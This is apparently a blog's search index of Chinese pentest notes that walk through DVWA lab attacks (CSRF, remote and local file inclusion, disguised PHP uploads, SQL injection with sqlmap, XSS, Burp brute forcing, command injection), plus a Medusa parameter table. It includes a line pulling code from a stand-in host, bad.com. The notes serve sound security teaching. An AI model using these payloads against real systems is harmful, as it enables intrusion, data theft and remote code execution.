http://train.com/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change 源码分析 判断请求来源页面是否为本系统页面。 1234// Checks to see where the request came fromif( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { //...} 其它与Low级别相同。 High 手工测试 与Medium级别相同。 不同的是构造的http请求需要包含页面上隐藏的token参数。(与XSS配合) 1http://train.com/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=253d1f2fad7d8c82627b1c356102ad4b# 源码分析 使用token验证身份 12// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 其它与Low级别相同。 最后重新生成token 12// Generate Anti-CSRF tokengenerateSessionToken(); Impossible 源码分析 使用token验证身份 与High级别相同。 验证当前用户存在 验证当前用户当前密码是否正确。 12345// Check that the current password is correct$data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );$data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );$data-&gt;execute(); 其它与High相同。","link":"/something-about-DVWA-CSRF/"},{"title":"something about DVWA - File Inclusion","text":"DVWADVWA =&gt; 备份地址 File Inclusion(文件包含)文件包含 php配置允许allow_url_include时允许文件包含，配置允许allow_url_fopen时允许包含远程文件。 Low 手工测试 本地文件包含 dvwa文件包含为此URL:http://train.com/dvwa/vulnerabilities/fi/?page=include.php,尝试替换include.php包含 本地敏感文件。 http://train.com/dvwa/vulnerabilities/fi/?page=C:\\xampp\\htdocs\\DVWA\\robots.txt http://train.com/dvwa/vulnerabilities/fi/?page=..\\..\\robots.txt 远程文件包含 将远程恶意文件url传递给dvwa。 http://train.com/dvwa/vulnerabilities/fi/?page=http://bad.com/bad.php 源码分析 直接在request中获取文件名，直接进行包含。 12// The page we wish to display$file = $_GET[ 'page' ]; Medium 手工测试 str_replace只会过滤一次，因此可以使用 重复构造 的方法( 双写 )进行绕过。 想要构造http://,因此构造httphttp://://，这样http://被过滤掉后，剩余的字符组合成 目标字符串 。 同样的，想要构造../，因此构造..././。 构造后的漏洞利用url为: http://train.com/dvwa/vulnerabilities/fi/?page=httphttp://://bad.com/bad.php http://train.com/dvwa/vulnerabilities/fi/?page=..././..././robots.txt 源码分析 从request中获取文件名后，使用str_replace将其中的敏感字串过滤掉。 123456// The page we wish to display$file = $_GET[ 'page' ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );&quot;file = str_replace( array( &quot;../&quot;, &quot;..\\\\&quot; ), &quot;&quot;, $file ); High 手工测试 由于强制要求文件名以file开头，可以使用File协议绕过判断。File协议为本地文件传输协议, 因此需要配合文件上传漏洞使用,将恶意文件上传至目标服务器，再使用File协议指定目标文件。 File协议使用: 1file://path/to/file 使用File协议后指定包含文件: 1http://train.com/dvwa/vulnerabilities/fi/?page=file://C:\\Windows\\System32\\drivers\\etc\\hosts 源码分析 从request中获取文件名后，判断其是否为固定字符开头(以file开头)。 1234// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { //...} Impossible 源码分析 从request中获取文件名后，判断其是否在允许包含的文件列表中。 1234// Only allow include.php or file{1..3}.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { //...}","link":"/something-about-DVWA-File-Inclusion/"},{"title":"something about DVWA - File Upload","text":"DVWADVWA =&gt; 备份地址 File Upload(文件上传)Low 手动测试 手动上传恶意文件 上传bad.php。 访问恶意文件 1http://train.com/dvwa/vulnerabilities/upload/../../hackable/uploads/bad.php 源码分析 从request中获取上传的文件 123// Where are we going to be writing to?$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 将文件移动至指定目录 123456// Can we move the file to the upload folder?if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // failure} else { // success} Medium 手动测试 将恶意文件扩展名更改为.png,上传 使用burpsuite拦截上传请求，将文件扩展名更改回.php 这样，上传请求的Content-Type为image/png，文件却为php。 源码分析 从request中获取上传的文件 与Low级别相同。 获取文件上传信息 1234// File information$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 判断HTTP的Content-Type属性 12345// Is it an image?if( ( $uploaded_type == &quot;image/jpeg&quot; ||$uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // yes} 将文件移动至指定目录 与Low级别相同。 High 手动测试 将恶意文件扩展名更改为.png,并在文件头处添加文件头信息 1234567GIF98&lt;?php // 将文件头设置为`GIF98` phpinfo();?&gt; 上传后使用File Inclusion漏洞包含此文件 12# File Inclusion Highhttp://train.com/dvwa/vulnerabilities/fi/?page=file://C:\\xampp\\htdocs\\DVWA\\hackable\\uploads/bad.png 源码分析 从request中获取上传的文件 与Medium级别相同。 获取HTTP的Content-Type;文件信息 123456// File information$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];$uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 判断HTTP的Content-Type;文件类型为image;文件头检测 12345678910// 判断文件扩展名// Is it an image?if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // getimagesize(file) 限制文件大小，并通过文件头判断文件类型} 将文件移动至指定目录 与Medium级别相同。 Impossible 源码分析 使用token验证身份 12// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 获取HTTP的Content-Type与文件信息 与High级别相同。 将文件 重命名 后移动至指定目录 123// 使用md5加密文件名//$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';$target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 1234// Can we move the file to the web root from the temp folder?if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // yes} 文件头 常见文件头 type header bmp 424D gif GIF98 jpeg FF D8 FF jpg FF D8 FF png 89 50 4E 47 0D 0A zip 504B0304","link":"/something-about-DVWA-File-Upload/"},{"title":"something about DVWA - SQL Injection(Blind)","text":"DVWADVWA =&gt; 备份地址 SQL Injection(Blind)(sql注入 盲注)在SQL注入过程中并不会给客户端返回查询到的内容。 用来对程序对应的数据存储区进行对应的探测。 盲注分类盲注主要有两种：基于时间,基于布尔的盲注。 基于时间的盲注 通过向SQL中注入sleep(int x)，观察响应时间是否有对应延迟，如果有,则数据是存储在数据库中。 例如： 123`--`或`#` 用来注释掉注入点之后的语句。select * from tableA A where A.colA = '1' # and A.colB = '2';select * from tableA A where A.colA = '1' -- and A.colB = '2'; 12# 查询并等待5s1' and sleep(5) # 基于布尔的盲注 通过向SQL中注入and 1=1或and 1=2，观察响应内容是否不同，如果不同，则数据是存储在数据库中。 例如： 12# 注入true1' 1=1 # 12# 注入false1' 1=2 # Low 手动测试 在注入点注入基于时间的盲注 能够观察到有明显的延迟。 11' and sleep(5)# 在注入点注入基于布尔的盲注 能够观察到两种布尔值对应的回应不相同。 121' and 1=1#1' and 1=2# 源码分析 直接从request中获取参数(GET) 12// Get input$id = $_GET[ 'id' ]; 直接将参数拼接入SQL文中执行 123// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ); // Removed 'or die' to suppress mysql errors 根据查询结果返回对应页面 123456789if ($exists) { // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;';} else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;';} Medium 手动测试 使用burpsuit拦截后，与Low级别相同。 针对mysqli_real_escape_string()的制御，可以将注入内容url encode，进行绕过。 源码分析 直接从request中获取参数(POST) 123// Get input$id = $_POST[ 'id' ];$exists = false; 将参数转义特殊字符后拼接入SQL执行 123456// 使用`mysqli_real_escape_string()`函数转义特殊字符。$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ); // Removed 'or die' to suppress mysql errors 根据查询结果返回对应页面 与Low级别相同。 High burpsuit 测试 抓包，找到注入点 123456789101112GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1Host: train.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://train.com/dvwa/security.phpConnection: closeCookie: id=2; security=high; PHPSESSID=9jcja8m0r7k7h2je6ife9ivmajUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache 针对Cookie: id=$2$注入 与Low级别相同，可得盲注结果。 源码分析 从cookie中获取参数 123// Get input$id = $_COOKIE[ 'id' ];$exists = false; 将参数直接拼接入SQL执行 限制查询条数。 123// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ); // Removed 'or die' to suppress mysql errors 根据查询结果返回对应页面 与Low级别相同。 Impossible 源码分析 通过token验证身份 123// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );$exists = false; 从request中获取参数(GET) 与Low级别相同。 以PDO方式预编译SQL参数查询 123456// Check the database$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );$data-&gt;execute();$exists = $data-&gt;rowCount(); 根据查询结果返回对应页面 与Low级别相同。","link":"/something-about-DVWA-SQL-Injection-Blind/"},{"title":"something about DVWA - SQL Injection","text":"DVWADVWA =&gt; 备份地址 SQL Injection(sql注入)Low sqlmap测试 使用burpsuit拦截请求 将请求保存为文本文件 使用sqlmap对已保存的请求做sql注入 1sqlmap -r ./sql.injection/sql.injection.low.txt --level=5 --risk=3 -p id 根据sqlmap结果构造恶意注入 1234# %27 =&gt; '# %3D =&gt; =# id=1'or'1'='1http://train.com/dvwa/vulnerabilities/sqli/?id=1%27or%271%27%3D%271&amp;Submit=Submit# 源码分析 直接从request中获取参数 12// Get input$id = $_REQUEST[ 'id' ]; 直接将参数拼接入SQL文中查询 123// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); Medium sqlmap测试 使用burpsuit拦截请求 将请求保存为文本文件 使用sqlmap对已保存的请求做sql注入 1sqlmap -r ./sql.injection/sql.injection.medium.txt --level=5 --risk=3 -p id --batch 根据sqlmap结果构造恶意注入 123# 构造的恶意`payload`# 将`post`参数内容提供为id=2 OR NOT 7336=7336 源码分析 直接从request中获取参数 与Low级别相同。 对参数转义特殊字符 使用mysqli_real_escape_string()函数转义特殊字符。 1$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); 直接将参数拼接入SQL文中查询 12$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;// 再进行查询 HighHigh级别主要是提交请求页面与结果渲染页面分离，此举主要为了防止sqlmap等自动化工具测试。 不过sqlmap有--second-url=xxx参数,可以用来手动指定结果渲染页面url。 sqlmap测试 使用burpsuit拦截请求 将请求保存为文本文件 使用sqlmap对已经保存的请求做sql注入 --second-url参数用于指定响应结果页面url。 1sqlmap -r ~/Documents/0pentest/sql.injection/sql.injection.high.txt --second-url=&quot;http://train.com/dvwa/vulnerabilities/sqli/&quot; 根据sqlmap结果构造恶意注入 源码分析 提交请求页面与响应结果渲染页面分开 提交请求页面: 1http://train.com/dvwa/vulnerabilities/sqli/session-input.php 结果渲染页面: 1http://train.com/dvwa/vulnerabilities/sqli/ 提交请求页面提交请求后会将参数内容放到session中。 从session中获取参数 12// Get input$id = $_SESSION[ 'id' ]; 直接将参数拼接入SQL文中查询 123// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;&quot;;// 再查询 根据sqlmap结果构造恶意注入 123# 构造的恶意`payload`# 将`post`参数内容提供为id=3' AND (SELECT 4198 FROM (SELECT(SLEEP(5)))Yudr) AND 'Jnep'='Jnep Impossible 源码分析 从token中验证身份 12// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 从request中获取参数 12// Get input$id = $_GET[ 'id' ]; 判断参数是否为数字 1234// Was a number entered?if(is_numeric( $id )) { // other statements} 将参数转为int值 1$id = intval ($id); 将参数以PDO的方式预编译进sql中进行查询 12345// Check the database$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );$data-&gt;execute();$row = $data-&gt;fetch();","link":"/something-about-DVWA-SQL-Injection/"},{"title":"something about DVWA - Weak Session ID","text":"DVWADVWA =&gt; 备份地址 Weak Session IDLow 源码分析 session id从0开始自增取值。 1234if (!isset ($_SESSION['last_session_id'])) { $_SESSION['last_session_id'] = 0;}$_SESSION['last_session_id']++; Medium 源码分析 session id设置为时间。 1$cookie_value = time(); High 源码分析 session id的值设置为从0开始的自增值的md5值。并设置session的 有效期 。 123456789// 从0开始的自增值if (!isset ($_SESSION['last_session_id_high'])) { $_SESSION['last_session_id_high'] = 0;}$_SESSION['last_session_id_high']++;// md5加密值$cookie_value = md5($_SESSION['last_session_id_high']);// 设置`session`有效期setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER['HTTP_HOST'], false, false); Impossible 源码分析 session id的值设置为时间的sha1值。并设置session的 有效期 。 12$cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;);setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER['HTTP_HOST'], true, true);","link":"/something-about-DVWA-Weak-Session-ID/"},{"title":"something about DVWA - XSS(DOM)","text":"DVWADVWA =&gt; 备份地址 XSS(DOM)XSS是跨站脚本攻击Cross-site scripting。 DOM类型的XSS是基于DOM文档对象模型的一种漏洞。 Low 手动测试 在URL中构造恶意参数: 123# %3C &lt;# %3E &gt;http://train.com/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&quot;bad&quot;);&lt;/script&gt; 源码分析 纯前端内容，无特殊。 Medium 手动测试 由于禁止了&lt;script&gt;标签，因此改用&lt;img/&gt;标签的onerror机制。 构造恶意URL: 123# `&quot;&lt;/select&gt;` 用于闭合`&lt;select&gt;标签`# `&lt;img/&gt;` 用于恶意XSShttp://train.com/dvwa/vulnerabilities/xss_d/?default=&quot;&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert('bad');&quot;/&gt; 源码分析 禁止&lt;script&gt;标签: 12345# Do not allow script tagsif (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit;} High 手动测试 尽管采用了白名单机制，但是，由于php和html注释符的差异性，可以绕过;即php注释掉的内容，在html中会正常渲染。 构造恶意URL 1http://train.com/dvwa/vulnerabilities/xss_d/?default=French#&lt;script&gt;alert(&quot;bad&quot;);&lt;/script&gt; 源码分析 采用白名单机制。 123456789101112# White list the allowable languagesswitch ($_GET['default']) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit;} Impossible 源码分析 服务端不做过多处理，客户端做防护：浏览器过滤XSS，过滤用户输入等。 XSS常用标签 script 1&lt;script&gt;alert(&quot;bad&quot;);&lt;/script&gt; img 1&lt;img src=&quot;nothing&quot; onerror=&quot;alert('bad');&quot; /&gt;","link":"/something-about-DVWA-XSS-DOM/"},{"title":"something about DVWA - XSS(Reflected)","text":"DVWADVWA =&gt; 备份地址 XSS(Reflected)XSS是跨站脚本攻击Cross-site scripting。 Reflected类型是 反射型 的XSS攻击，此类型的XSS未保存在目标服务器上，是攻击者恶意插入在html中的内容。 Low 手动测试 在URL中构造恶意参数。 1http://train.com/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert('bad');&lt;/script&gt; 源码分析 将页面输入的内容直接输入至拼接至页面渲染 12345// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';} Medium 手动测试 双写&lt;script&gt; 构造双写&lt;script&gt;为&lt;script&lt;script&gt;&gt;; 1http://train.com/dvwa/vulnerabilities/xss_r/?name=&lt;script&lt;script&gt;&gt;alert('bad');&lt;/script&gt; 源码分析 过滤&lt;scrip&gt;标签 12// Get input$name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); High 手动测试 采用&lt;img/&gt;标签 利用&lt;img/&gt;标签的onerror机制,构造恶意URL。 1http://train.com/dvwa/vulnerabilities/xss_r/?name=&lt;img src=&quot;nothing&quot; onerror=&quot;alert('bad');&quot;/&gt; 源码分析 以正则表达式的方式过滤&lt;script&gt;标签 12// Get input$name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); Impossible 源码分析 将参数转义为html符号实体 使用htmlspecialchars()函数将如&lt;等特殊符号转义为&amp;lt;等html实体。 12// Get input$name = htmlspecialchars( $_GET[ 'name' ] );","link":"/something-about-DVWA-XSS-Reflected/"},{"title":"something about DVWA - XSS(Stored)","text":"DVWADVWA =&gt; 备份地址 XSS(Stored)XSS是跨站脚本攻击Cross-site scripting。 Stored类型是 存储型 的XSS攻击，此类型的XSS保存在目标服务器上，用户每次访问都会被攻击。 Low 手动测试 直接在内容中输入恶意内容后提交。 1&lt;script&gt;alert(&quot;bad&quot;);&lt;/script&gt; 源码分析 将参数内容存储到DB中 使用stripslashes()和mysqli_real_escape_string()函数，转义特殊字符。 12// Update database$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );&quot;; Medium 手动测试 对name进行注入。采用双写绕过过滤。 注入内容: 1&lt;script&lt;script&gt;&gt;alert('bad');&lt;/script&gt; 源码分析 对message内容去除html标签 使用strip_tags()去除html标签。 12// Sanitize message input$message = strip_tags( addslashes( $message ) ); 对name过滤&lt;script&gt;标签 12// Sanitize name input$name = str_replace( '&lt;script&gt;', '', $name ); High 手动测试 采用&lt;img/&gt;标签 对name注入&lt;img onerror=&quot;&quot;/&gt;。 1&lt;img src=&quot;1&quot; onerror=&quot;alert('bad');&quot; /&gt; 源码分析 使用正则的方式过滤&lt;script&gt;标签 12// Sanitize name input$name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); Impossible 源码分析 去除参数中的\\ 使用stripslashes()去除字符串中的\\字符。 转义特殊字符 使用mysqli_real_escape_string()函数转义特殊字符。 预编译SQL执行 使用PDO的方式执行SQL。","link":"/something-about-DVWA-XSS-Stored/"},{"title":"something about DVWA - brute force","text":"DVWADVWA =&gt; 备份地址 Brute Force(暴力破解)Low 选取暴破点 GET /dvwa/vulnerabilities/brute/?username=admin&amp;password=§p§&amp;Login=Login HTTP/1.1 中， 对password进行暴破。 设置payload Attact type选择Sniper，Payloads选择Runtime file, 既而选择密码 字典文件(2019_top100.txt),暴力破解即可。 源码分析 直接从request中获取参数 1$pass = $_GET[ 'password' ]; 直接将参数以字符串的方式拼接入sql 1$query = &quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';&quot;; Medium 选取暴破点 与Low级别相同。 设置payload 与Low级别相同。 源码分析 从request中获取参数后，使用mysqli_real_escape_string函数对参数中可能干扰到sql查询的特殊字符进行删除。 1$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); High 选取暴破点 由于有token检测，除了password暴破点外，还需要设置user_token暴破点。 GET /dvwa/vulnerabilities/brute/?username=admin&amp;password=§pa§&amp;Login=Login&amp;user_token=§ad5031ef52b181892a11a845db6807b7§ HTTP/1.1 设置Options 由于需要绕过token检测，因此需要获取页面请求时返回的token值。 由于需要先进行页面请求,再进行暴破，因此需要用到重定向。 Redirections中设置Follow redirections: 为Always 在Options中，Grep - Extract中添加一条记录，捕获token值。 Refetch response后,选中token的value值，burpsuite会自动生成对应的捕获正则表达式， 添加即可在每次的页面请求response中捕获对应token值，用于payload中。 由于绕过token需要对每一次的页面请求response的token值进行捕获，因此不可以使用多线程。 Resource Pool中自定义Max concurrent requests为1的规则。 设置payload Attact type设置为Pitchfork后对每个暴破点设置payload。 password暴破点的payload正常设置。 token的payload设置为Recursive grep，也即使用捕获的token值。 源码分析 检测token 先进行token的检测检测通过，再进行后续操作。 1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); stripslashes函数过滤参数 从request中获取参数后，先使用stripslashes函数去除参数中的\\字符。 1$pass = stripslashes( $pass ); mysqli_real_escape_string函数过滤参数 再使用mysqli_real_escape_string函数对参数中可能干扰到sql查询的特殊字符进行删除。 1$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); Impossible相比High级别，增加了尝试次数的限定，超过尝试次数后一段时间内禁止尝试。 1234// Default values$total_failed_login = 3;$lockout_time = 15;$account_locked = false;","link":"/something-about-DVWA-brute-force/"},{"title":"something about DVWA - command injection","text":"DVWADVWA =&gt; 备份地址 Command Injection(命令注入)Low 手动注入 在命令参数尾部手动拼接&amp;,&amp;&amp;,|,||,;等,与其它命令。 命令连接符 &amp; 使得命令在后台运行。 12# 在后台更新软件包索引apt update &amp; ; 按顺序执行分隔的每条命令。 12# 先更新索引 再更新软件包apt update ; apt upgrade &amp;&amp; 短路与 前一条命令执行成功时，执行后一条命令; 前一条命令执行失败，不会执行后一条命令。 12# 更新软件包索引，成功后更新软件包apt update &amp;&amp; apt upgrade || 短路或 前一条命令执行失败时，执行后一条命令; 前一条命令执行成功，不会执行后一条命令。 12# 更新软件包索引失败时，打印信息apt update || echo &quot;update failure&quot; ! 排除命令执行对象。 12# 删除当前目录下，除html文件的所有文件rm -r !(*.html) &amp;&amp; 和 || &amp;&amp;和||搭配可以形成if-else选择分支。 12# 先更新软件包索引，成功就更新软件包，失败就打印信息apt update &amp;&amp; apt upgrade || echo &quot;update failure&quot; | 管道运算符，前一条命令的输出作为后一条命令的输入。 12# 列出当前文件夹下所有文件，并筛选文件名包含`example`的内容打印ls | grep example {} 合并多条命令，使得分隔在一起的命令中，后面的命令依赖于前面的命令。 12# ping web服务器，连接不上，就重启网络服务并打印信息ping www.example.com || {service networking restart ; echo &quot;start networking ...&quot;} () 给命令分组,用以改变优先级。 12# 倘若`echo &quot;1&quot;`执行失败，`echo &quot;3&quot; &amp;&amp; echo &quot;4&quot;`依然会执行(echo &quot;1&quot; &amp;&amp; echo &quot;2&quot;) || (echo &quot;3&quot; &amp;&amp; echo &quot;4&quot;) \\ 用以将长命令换行。 123# 打印&quot;hello world&quot;echo &quot;hello \\world&quot; Windows下命令连接符不同意义: &amp;&amp; 短路与 前一条命令执行成功时，执行后一条命令; 前一条命令执行失败，不会执行后一条命令。 &amp; 真与 无论情况如何，被分隔的命令都会执行。 || 短路或 前一条命令执行失败时，执行后一条命令; 前一条命令执行成功，不会执行后一条命令。 | 真或 无论情况如何，被分隔的命令都会被执行。 ; Windows 不支持 ;分隔符。 源码分析 直接从request中获取参数 12// Get input$target = $_REQUEST[ 'ip' ]; 直接将参数以字符串的方式拼接入command中 使用shell_exec函数调用函数。 12// *nix$cmd = shell_exec( 'ping -c 4 ' . $target ); Medium 手动注入 不使用黑名单字符，使用其它命令连接符。 源码分析 直接从request中获取参数 与Low级别相同。 设置 黑名单 12345// Set blacklist$substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '',); 过滤黑名单字符 使用str_replace函数过滤字符。 12// Remove any of the charactars in the array (blacklist).$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 将过滤后的命令以字符串的方式拼接入command中 12// *nix$cmd = shell_exec( 'ping -c 4 ' . $target ); High 手动注入 使用|进行注入，注意|后不跟随空格。 源码分析 直接从request中获取参数，过滤首尾空白字符 12// Get input$target = trim($_REQUEST[ 'ip' ]); 设置黑名单 此黑名单 不完善 。 12345678910111213// 注意'| '，有 `空格`,因此不完善// Set blacklist$substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '',); 过滤黑名单字符 与Medium相同。 将过滤后的命令以字符串的方式拼接入command中 与Medium相同。 Impossible针对命令注入: 首先在获取参数时使用stripslashes函数去除参数中的反斜杠(\\) 其次针对特定命令参数分解判断 ping ip.ip.ip.ip中针对ip地址，分别判断。 1234567// Split the IP into 4 octects$octet = explode( &quot;.&quot;, $target );// Check IF each octet is an integerif( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // ...}","link":"/something-about-DVWA-command-injection/"},{"title":"something about Medusa","text":"Medusa参数 Medusa版本:[v2.2] MedusaGitHub仓库 使用例：medusa -h host -u username -p password -M module 参数 含义 备注 -h [TEXT] 指定主机名或 IP地址 -H [FILE] 指定包含主机名列表或 IP地址列表 的 文件 常用 -u [TEXT] 指定测试的 用户名 小写字母u -U [FILE] 指定包含测试 用户名列表 的 文件 大写字母U，常用 -p [TEXT] 指定测试的 密码 小写字母p -P [FILE] 指定包含测试 密码列表 的 文件 大写字母P，常用 -C [FILE] 指定 组合条目 文件 小写字母C组合条目为( 主机:用户名:密码 )的组合 -O [FILE] 指定输出 日志 文件 -e [n/s/ns] 额外密码测试( [n]:无密码测试 , [s]密码和用户名相同 ) -M [TEXT] 指定模块名 ，省略(.mod)扩展名 常用 -m [TEXT] 指定传递给模块的参数，可多次传递 -m p1 -m p2 -m p3 … -d 列出所有可用模块 -n [NUM] 指定使用非默认TCP端口，指定端口 -s 开启SSL -g [NUM] 设定达到 指定秒数 后放弃尝试，默认为3秒 -r [NUM] 设定每次 重新尝试 间隔的秒数 -R [NUM] 设定放弃之前 尝试次数 ，总次数为NUM+1 -c [NUM] 设定等待验证socket的时间(usec),默认500usec -t [NUM] 设定 同时测试的登录总数 -T [NUM] 设定 同时测试的主机总数 -L 设定 每个线程 使用 一个用户名 进行登录，默认为在进行之前先处理全部用户名； -f 设定找到 正确的用户名/密码 时停止扫描 该主机 ； 常用 -F 设定找到 第一个正确的用户名/密码 时停止扫描 所有主机 ； -b 禁止启动banner. -q 显示模块使用信息 -v [NUM] 设定 冗余信息(verbose)等级 [0-6(more)] 小写字母V -w [NUM] 设定 错误DEBUG等级 [0-10(more)] -V 显示版本信息 大写字母V -Z [TEXT] 根据上次扫描内容， 继续扫描 参数说明-C指定 组合条目 文件 组合条目为 host:username:password的组合,一行记录一个条目. 接受如下组合: host:username:password host:username: host:: :username:password :username: ::password host::password 使用例: 1medusa -M smbnt -C combo.txt -H hosts.txt","link":"/something-about-Medusa/"},{"title":"something about Netcat","text":"Netcat参数 Netcat版本:[v1.10-46] 